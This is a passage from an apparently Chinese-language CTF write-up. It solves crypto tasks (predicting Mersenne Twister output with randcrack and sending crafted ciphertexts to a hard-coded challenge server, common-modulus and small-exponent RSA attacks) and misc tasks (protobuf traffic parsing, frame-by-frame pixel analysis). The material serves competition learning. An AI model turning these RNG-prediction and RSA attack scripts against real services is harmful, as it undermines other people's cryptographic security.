            pix = (pix^k2)&amp;0xff
        if ch == 3:
            pix = ~(pix^k2)&amp;0xff
        res.append(pix)
print(res)
```

### <a class="reference-link" name="homo"></a>homo

先是一个随机数预测,提交312个64比特即可预测<br>
然后直接构造c0=[1,0,0,0….]<br>
c1=[q//2,0,0,0,]<br>
发给服务器即可解出sk,然后再本地对ctj进行解密即可

```
from pwn import*
from randcrack import RandCrack
sh=remote("124.71.238.180","22444")
sh.recvuntil("]")
sh.recvuntil("]")
sh.recvuntil("]")
sh.recvuntil("]")
print(sh.recv().decode())
sh.sendline("1")
m=[]
for i in range(312):
    sh.recv()
    sh.sendline("0")
    sh.recvuntil("is ")
    t=sh.recvuntil("\n",drop=True)
    m.append(int(t,10)&amp;(0xffffffff))
    m.append(int(t,10)&gt;&gt;32)
rc = RandCrack()
for i in range(624):
    rc.submit(m[i])
for i in range(200):
    h=rc.predict_randrange(0, 4294967295)
    l=rc.predict_randrange(0, 4294967295)
    print(sh.recv().decode())
    sh.sendline(str((l&lt;&lt;32)+(h)))

    # print(sh.recvuntil("is ").decode(),end='')
    # t=sh.recvuntil("\n",drop=True)
    # print(t.decode())
    # print("my answer is "+str((l&lt;&lt;32)+(h)))
sh.sendline("2")
print(sh.recv().decode())
a=["0"]*1023
a.append("1")
a=",".join(a)
sh.sendline(a)
print(sh.recv().decode())
sh.sendline(a)
print(sh.recvall().decode())
```

### <a class="reference-link" name="rsa"></a>rsa

第一关直接开3次方<br>
第二关用扩展欧几里得<br>
第三关用coppersmith解出p即可

```
# e,n=(3, 123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009)
# c1= 54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610
# c2= 91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950
# e,n=(17, 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977)
# (65537, 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L)
# 59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646
# (65537, 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L)
# 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902
# print(iroot(c,3)[0])
# print(long_to_bytes(267334379257781603687613466720913534310764480084016847281446486946801530200295563483353634338157))
b' \nO wild West Wind, thou breath of Autum'
b"n's being,\nThou, from whose unseen presence the leaves dead\nAre driven, like ghosts from an enchanter fleeing,\nYellow, a"
# print(30841*17-8*65537)
# print(long_to_bytes(pow(c1,30841,n)*invert(pow(c2,8,n),n)%n))
# print(long_to_bytes(978430871477569051989776547659020359721056838635797362474311886436116962354292851181720060000979143571198378856012391742078510586927376783797757539078239088349758644144812898155106623543650953940606543822567423130350207207895380499638001151443841997176299548692737056724423631882))
x=b' \nO wild West Wind, thou breath of Autum'+b"n's being,\nThou, from whose unseen presence the leaves dead\nAre driven, like ghosts from an enchanter fleeing,\nYellow, a"+b'nd black, and pale, and hectic red,\nPestilence-stricken multitudes: O thou,\nWho chariotest to their dark wintry bed\n'
print(x)
```



## misc

### <a class="reference-link" name="tiny%20traffic"></a>tiny traffic

wireshark导出所有http对象后得到test,secret,flag_wrapper，test是一个压缩文件：

解压得到一个文件：

```
syntax = "proto3";

message PBResponse `{`
  int32 code = 1;
  int64 flag_part_convert_to_hex_plz = 2;
  message data `{`
    string junk_data = 2;
    string flag_part = 1;
  `}`
  repeated data dataList = 3;
  int32 flag_part_plz_convert_to_hex = 4;
  string flag_last_part = 5;
`}`

message PBRequest `{`
  string cate_id = 1;
  int32 page = 2;
  int32 pageSize = 3;
`}`
```

到[https://protogen.marcgravell.com/编译得到py包。](https://protogen.marcgravell.com/%E7%BC%96%E8%AF%91%E5%BE%97%E5%88%B0py%E5%8C%85%E3%80%82)<br>
再用brotli -d解压secret得到secret_unpack。脚本解析：

```
import pb2

with open("secret_unpack", "rb") as f:
    data = f.read()
response = pb2.PBResponse()
response.ParseFromString(data)
print(response)

得到
code: 200
flag_part_convert_to_hex_plz: 15100450
dataList `{`
  flag_part: "e2345"
  junk_data: "7af2c"
`}`
dataList `{`
  flag_part: "7889b0"
  junk_data: "82bc0"
`}`
flag_part_plz_convert_to_hex: 16453958
flag_last_part: "d172a38dc"
```

即可拼凑出flag

### <a class="reference-link" name="running%20pixel"></a>running pixel

用ps导出所有帧观察，发现每隔10帧像素人就会变黄。重新处理一下图像：

```
from PIL import *

for i in range(382):
    image = Image.open("images/%d.jpg" % i).convert("RGB")
    xs, ys = image.size
    for x in range(xs):
        for y in range(ys):
            if image.getpixel((x, y)) == (233, 233, 233):
                image.putpixel((y, x), 0)
                image.save("new/%d.jpg" % i)
```

依据字符出现顺序拼接得到flag
